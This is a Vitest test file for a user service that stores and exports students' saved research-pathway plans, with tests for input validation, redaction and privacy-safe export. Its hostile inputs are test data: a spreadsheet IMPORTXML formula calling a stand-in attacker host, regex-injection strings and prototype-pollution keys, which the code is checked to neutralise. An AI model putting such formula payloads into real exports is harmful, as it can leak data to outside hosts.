import { describe, expect, it } from 'vitest';
import mongoose from 'mongoose';
import {
  MAX_SAVED_PATHWAY_NOTE_LENGTH,
  buildCaseInsensitiveNetidFilter,
  buildSavedPathwayPlanUnsetForIds,
  buildSavedPathwayPlansExport,
  normalizeObjectIdStringForUserMutation,
  normalizeObjectIdsForUserMutation,
  normalizeUserLookupObjectId,
  pruneSavedPathwayPlansForExistingPathways,
  sanitizeSavedPathwayPlanForStorage,
  type SavedPathwayPlanInput,
} from '../userService';
import type { PathwaySearchHit } from '../pathwaySearchService';

const pathway = (overrides: Partial<PathwaySearchHit> = {}): PathwaySearchHit => ({
  _id: '665f0b0c0b0c0b0c0b0c0b0c',
  pathwayType: 'EXPLORATORY_CONTACT',
  status: 'PLAUSIBLE',
  evidenceStrength: 'INDIRECT',
  studentFacingLabel: 'Explore archival climate records',
  bestNextStepCategory: 'plan-outreach',
  sourceUrls: ['https://example.edu/pathway', 'mailto:private@example.edu'],
  researchEntity: {
    _id: '665f0b0c0b0c0b0c0b0c0b0d',
    slug: 'climate-archive',
    name: 'Climate Archive',
    departments: ['History'],
    researchAreas: ['Environmental history'],
  },
  activePostedOpportunity: {
    _id: '665f0b0c0b0c0b0c0b0c0b0e',
    title: 'Archive assistant',
    applicationUrl: 'https://example.edu/apply',
    status: 'OPEN',
  },
  evidence: [
    {
      signalType: 'posted_opening',
      confidence: 'HIGH',
      sourceUrl: 'https://example.edu/evidence',
    },
  ],
  contactRoute: {
    routeType: 'FACULTY_PI',
    label: 'Private contact route',
    url: 'mailto:private@example.edu',
    visibility: 'PRIVATE',
  },
  ...overrides,
});

describe('buildCaseInsensitiveNetidFilter', () => {
  it('rejects malformed netids before building regex filters', () => {
    expect(() => buildCaseInsensitiveNetidFilter('.*+$[x]')).toThrow(/Invalid netid/);
    expect(() => buildCaseInsensitiveNetidFilter('a'.repeat(4096))).toThrow(/Invalid netid/);
  });

  it('rejects object-shaped netids without invoking arbitrary toString', () => {
    const objectNetid = {
      toString: () => 'aa123',
    };

    expect(() => buildCaseInsensitiveNetidFilter(objectNetid)).toThrow(/Invalid netid/);
  });

  it('preserves case-insensitive exact netid matching', () => {
    const filter = buildCaseInsensitiveNetidFilter('Aa123');
    const regex = new RegExp(filter.netid.$regex, filter.netid.$options);

    expect(regex.test('aa123')).toBe(true);
    expect(regex.test('xaa123')).toBe(false);
  });
});

describe('normalizeUserLookupObjectId', () => {
  it('accepts string and ObjectId account lookup ids', () => {
    const id = '665f0b0c0b0c0b0c0b0c0b0c';

    expect(normalizeUserLookupObjectId(id)).toBe(id);
    expect(normalizeUserLookupObjectId(new mongoose.Types.ObjectId(id))).toBe(id);
  });

  it('rejects object-shaped account lookup ids without invoking arbitrary toString', () => {
    expect(
      normalizeUserLookupObjectId({
        toString: () => '665f0b0c0b0c0b0c0b0c0b0c',
      }),
    ).toBeNull();
  });
});

describe('pruneSavedPathwayPlansForExistingPathways', () => {
  it('keeps plans only for pathways that still resolve', () => {
    const result = pruneSavedPathwayPlansForExistingPathways(
      {
        '665f0b0c0b0c0b0c0b0c0b0c': {
          intent: 'outreach',
          stage: 'ready',
        },
        '665f0b0c0b0c0b0c0b0c0b0d': {
          intent: 'thesis',
          stage: 'researching',
        },
      },
      ['665f0b0c0b0c0b0c0b0c0b0c'],
    );

    expect(result).toEqual({
      '665f0b0c0b0c0b0c0b0c0b0c': {
        intent: 'outreach',
        stage: 'ready',
      },
    });
  });
});

describe('sanitizeSavedPathwayPlanForStorage', () => {
  it('keeps valid date-only reminders and rejects invalid dates and intervals', () => {
    expect(sanitizeSavedPathwayPlanForStorage({
      targetDeadline: '2026-09-30',
      actedOnDate: '2026-02-29',
      followUpIntervalDays: 14,
    })).toMatchObject({
      targetDeadline: '2026-09-30',
      actedOnDate: null,
      followUpIntervalDays: 14,
    });
    expect(sanitizeSavedPathwayPlanForStorage({
      targetDeadline: '09/30/2026',
      actedOnDate: '2026-07-12T00:00:00Z',
      followUpIntervalDays: 15,
    })).toMatchObject({ targetDeadline: null, actedOnDate: null, followUpIntervalDays: null });
  });

  it('normalizes create/update payloads before persisting a saved pathway plan', () => {
    const result = sanitizeSavedPathwayPlanForStorage({
      intent: 'mass-email',
      stage: 'ready',
      note: `${'a'.repeat(MAX_SAVED_PATHWAY_NOTE_LENGTH + 1)}`,
      checklist: {
        'review-evidence': true,
        'bad-value': 'yes',
        '': true,
      },
    });

    expect(result.intent).toBe('later');
    expect(result.stage).toBe('ready');
    expect(result.note).toHaveLength(MAX_SAVED_PATHWAY_NOTE_LENGTH);
    expect(result.checklist).toEqual({
      'review-evidence': true,
      'bad-value': false,
    });
  });

  it('bounds saved pathway checklist entries before storage', () => {
    const result = sanitizeSavedPathwayPlanForStorage({
      checklist: Object.fromEntries(
        Array.from({ length: 60 }, (_, index) => [`task-${index}`, index % 2 === 0]),
      ),
    });

    expect(Object.keys(result.checklist)).toHaveLength(50);
    expect(result.checklist).toHaveProperty('task-0', true);
    expect(result.checklist).toHaveProperty('task-49', false);
    expect(result.checklist).not.toHaveProperty('task-50');
  });

  it('ignores non-object saved pathway checklists before storage', () => {
    const result = sanitizeSavedPathwayPlanForStorage({
      checklist: ['email-pi', 'draft-note'] as any,
    });

    expect(result.checklist).toEqual({});
  });

  it('stops reading saved pathway checklist keys after the storage cap', () => {
    const result = sanitizeSavedPathwayPlanForStorage({
      checklist: Object.fromEntries(
        Array.from({ length: 10_000 }, (_, index) => [`task-${index}`, true]),
      ),
    });

    expect(Object.keys(result.checklist)).toHaveLength(50);
    expect(result.checklist).toHaveProperty('task-0', true);
    expect(result.checklist).toHaveProperty('task-49', true);
    expect(result.checklist).not.toHaveProperty('task-9999');
  });

  it('drops oversized saved pathway checklist keys before storage', () => {
    const result = sanitizeSavedPathwayPlanForStorage({
      checklist: {
        ['a'.repeat(121)]: true,
        'review-evidence': true,
      },
    });

    expect(result.checklist).toEqual({ 'review-evidence': true });
  });

  it('normalizes saved pathway checklist keys before storage', () => {
    const result = sanitizeSavedPathwayPlanForStorage({
      checklist: {
        ' review.evidence ': true,
        $set: true,
        constructor: true,
        prototype: true,
      },
    });

    expect(result.checklist).toEqual({
      review_evidence: true,
      _set: true,
    });
    expect(Object.prototype.hasOwnProperty.call(result.checklist, 'constructor')).toBe(false);
    expect(Object.prototype.hasOwnProperty.call(result.checklist, 'prototype')).toBe(false);
  });

  it('sanitizes and bounds completed checklist history for durable storage', () => {
    const result = sanitizeSavedPathwayPlanForStorage({
      intent: 'credit',
      checklistHistory: [
        {
          intent: 'outreach',
          label: '  Contact the program office  ',
          completedAt: '2026-07-11T12:00:00Z',
        },
        { intent: 'invalid', label: 'Dropped', completedAt: '2026-07-11T12:00:00Z' },
        { intent: 'thesis', label: 'Bad date', completedAt: 'not-a-date' },
      ],
    });

    expect(result.checklistHistory).toEqual([
      {
        intent: 'outreach',
        label: 'Contact the program office',
        completedAt: '2026-07-11T12:00:00.000Z',
      },
    ]);
  });
});

describe('buildSavedPathwayPlanUnsetForIds', () => {
  it('builds update paths used when saved pathways or plans are deleted', () => {
    expect(
      buildSavedPathwayPlanUnsetForIds(['665f0b0c0b0c0b0c0b0c0b0c', '665f0b0c0b0c0b0c0b0c0b0d']),
    ).toEqual({
      'savedPathwayPlans.665f0b0c0b0c0b0c0b0c0b0c': '',
      'savedPathwayPlans.665f0b0c0b0c0b0c0b0c0b0d': '',
    });
  });
});

describe('normalizeObjectIdsForUserMutation', () => {
  it('normalizes ObjectId instances without falling back to arbitrary object coercion', () => {
    const objectId = new mongoose.Types.ObjectId('665f0b0c0b0c0b0c0b0c0b0c');

    expect(normalizeObjectIdStringForUserMutation(objectId, 'favPathways')).toBe(
      '665f0b0c0b0c0b0c0b0c0b0c',
    );
  });

  it('normalizes valid ObjectId strings for account mutations', () => {
    const result = normalizeObjectIdsForUserMutation(
      ['665f0b0c0b0c0b0c0b0c0b0c'],
      'savedResearchPlans',
    );

    expect(result.map((id) => id.toString())).toEqual(['665f0b0c0b0c0b0c0b0c0b0c']);
  });

  it('rejects arbitrary object-shaped ids instead of invoking toString', () => {
    const objectIdLike = {
      toString: () => '665f0b0c0b0c0b0c0b0c0b0c',
    };

    expect(() => normalizeObjectIdsForUserMutation([objectIdLike], 'favListings')).toThrow(
      /Invalid favListings id/,
    );
  });

  it('rejects non-array account mutation batches before per-id work', () => {
    expect(() =>
      normalizeObjectIdsForUserMutation({ 0: '665f0b0c0b0c0b0c0b0c0b0c' } as any, 'favListings'),
    ).toThrow(/Invalid favListings ids/);
  });

  it('rejects malformed ids before they reach Mongo update paths', () => {
    expect(() => normalizeObjectIdsForUserMutation(['not-an-object-id'], 'favPathways')).toThrow(
      /Invalid favPathways id/,
    );
    try {
      normalizeObjectIdsForUserMutation(['not-an-object-id'], 'favPathways');
    } catch (error: any) {
      expect(error.status).toBe(400);
    }
  });

  it('rejects oversized account mutation batches before per-id work', () => {
    const ids = Array.from({ length: 101 }, (_, index) => index.toString(16).padStart(24, '0'));

    expect(() => normalizeObjectIdsForUserMutation(ids, 'favPathways')).toThrow(
      /Too many favPathways ids/,
    );
    try {
      normalizeObjectIdsForUserMutation(ids, 'favPathways');
    } catch (error: any) {
      expect(error.status).toBe(400);
    }
  });
});

describe('buildSavedPathwayPlansExport', () => {
  it('exports saved pathway planning fields without contact routes or private notes by default', () => {
    const savedPlans: Record<string, SavedPathwayPlanInput> = {
      '665f0b0c0b0c0b0c0b0c0b0c': {
        intent: 'outreach',
        stage: 'ready',
        note: 'Ask whether undergraduates can help with digitization.',
        checklist: {
          'outreach-route': true,
          'outreach-followup': false,
          'ignored-null': null,
        },
      },
    };

    const result = buildSavedPathwayPlansExport([pathway()], savedPlans, {
      exportedAt: new Date('2026-05-13T12:00:00.000Z'),
    });

    expect(result).toMatchObject({
      schemaVersion: 1,
      exportedAt: '2026-05-13T12:00:00.000Z',
      itemCount: 1,
      privacy: {
        includesPrivateNotes: false,
        includesContactRoutes: false,
        includesNonPublicContactEmails: false,
      },
      items: [
        {
          pathwayId: '665f0b0c0b0c0b0c0b0c0b0c',
          title: 'Explore archival climate records',
          intent: 'outreach',
          stage: 'ready',
          checklist: {
            'outreach-route': true,
            'outreach-followup': false,
            'ignored-null': false,
          },
          sourceLinks: [
            'https://example.edu/pathway',
            'https://example.edu/evidence',
            'https://example.edu/apply',
          ],
          bestNextStepCategory: 'plan-outreach',
        },
      ],
    });
    expect(result.items[0]).not.toHaveProperty('privateNote');
    expect(JSON.stringify(result)).not.toContain('private@example.edu');
    expect(JSON.stringify(result)).not.toContain('contactRoute');
  });

  it('includes private notes only when the caller explicitly requests them', () => {
    const result = buildSavedPathwayPlansExport(
      [pathway()],
      {
        '665f0b0c0b0c0b0c0b0c0b0c': {
          note: 'Bring this to advising.',
        },
      },
      {
        includePrivateNotes: true,
      },
    );

    expect(result.privacy.includesPrivateNotes).toBe(true);
    expect(result.items[0].privateNote).toBe('Bring this to advising.');
  });

  it('neutralizes formula-like strings in saved plan exports', () => {
    const result = buildSavedPathwayPlansExport(
      [
        pathway({
          studentFacingLabel: '=IMPORTXML("https://attacker.invalid","//a")',
          researchEntity: {
            _id: '665f0b0c0b0c0b0c0b0c0b0d',
            slug: 'climate-archive',
            name: '+cmd',
            displayName: '@hidden',
            departments: ['History'],
            researchAreas: ['Environmental history'],
          },
        }),
      ],
      {
        '665f0b0c0b0c0b0c0b0c0b0c': {
          note: '-run command',
          checklist: {
            '=callout': true,
          },
        },
      },
      {
        includePrivateNotes: true,
      },
    );

    expect(result.items[0].title).toBe('\'=IMPORTXML("https://attacker.invalid","//a")');
    expect(result.items[0].researchEntity.name).toBe("'@hidden");
    expect(result.items[0].privateNote).toBe("'-run command");
    expect(result.items[0].checklist).toEqual({ "'=callout": true });
  });

  it('redacts direct contact details from exported system-derived labels', () => {
    const result = buildSavedPathwayPlansExport(
      [
        pathway({
          studentFacingLabel: 'Email lab-manager@yale.edu or call 203-555-1212',
          researchEntity: {
            _id: '665f0b0c0b0c0b0c0b0c0b0d',
            slug: 'climate-archive',
            name: 'Climate Archive contact archive@example.edu',
            displayName: 'Climate Archive 203-555-0000',
            departments: ['History'],
            researchAreas: ['Environmental history'],
          },
        }),
      ],
      {},
    );

    expect(result.items[0].title).toBe('Email [email redacted] or call [phone redacted]');
    expect(result.items[0].researchEntity.name).toBe('Climate Archive [phone redacted]');
    expect(result.privacy.includesNonPublicContactEmails).toBe(false);
    expect(JSON.stringify(result)).not.toContain('lab-manager@yale.edu');
    expect(JSON.stringify(result)).not.toContain('archive@example.edu');
    expect(JSON.stringify(result)).not.toContain('203-555');
  });

  it('defaults missing plans to a student-facing intent from the pathway action', () => {
    const result = buildSavedPathwayPlansExport(
      [pathway({ bestNextStepCategory: 'find-funding' })],
      {},
    );

    expect(result.items[0]).toMatchObject({
      intent: 'funding',
      stage: 'saved',
      checklist: {},
    });
  });
});
